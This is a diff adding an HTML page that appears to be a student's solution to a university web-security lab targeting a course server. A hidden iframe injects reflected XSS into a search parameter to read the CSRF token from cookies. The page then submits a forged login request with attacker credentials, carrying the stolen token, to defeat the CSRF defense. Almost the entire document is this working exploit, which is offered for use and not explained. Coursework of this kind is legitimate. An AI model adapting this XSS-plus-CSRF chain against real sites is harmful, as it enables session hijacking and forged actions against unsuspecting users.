@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<meta charset="utf-8">
+
+<iframe src="http://cs526-online.cs.purdue.edu/project2b/search?q=%3Cscript%3Evar+cookie_string+%3D+document.cookie%3Bvar+spot+%3D+cookie_string.search%28%22csrf_token%3D%22%29%3Bvar+cookie_code+%3D+cookie_string.substring%28spot%2B11%2Cspot%2B43%29%3B+window.parent.postMessage%28cookie_code%29%3B%3C%2Fscript%3E" names="iframe1" style="display: none;"></iframe>
+
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<body>
+<form id = "attack" action="http://cs526-online.cs.purdue.edu/project2b/login?csrfdefense=1&xssdefense=0" method="post">
+    <input type="hidden" id = "username" name="username" value="attacker" />
+    <input type="hidden" id = "password" name="password" value="123456" />	
+</form>
+</body>
+
+<script> window.addEventListener("message",function (e) {
+    console.log("POOP");
+    console.log(e.data);
+	var input = document.createElement("input");
+	input.type = "hidden";
+	input.name = "csrf_token";
+	input.value = new String(e.data);
+	document.getElementById("attack").appendChild(input);
+	$.ajax({type: 'POST',data: $('#form1').serialize(),	url: 'http://cs526-online.cs.purdue.edu/project2b/login?csrfdefense=1&xssdefense=0',xhrFields:{withCredentials: true}});
+},false);
+</script>
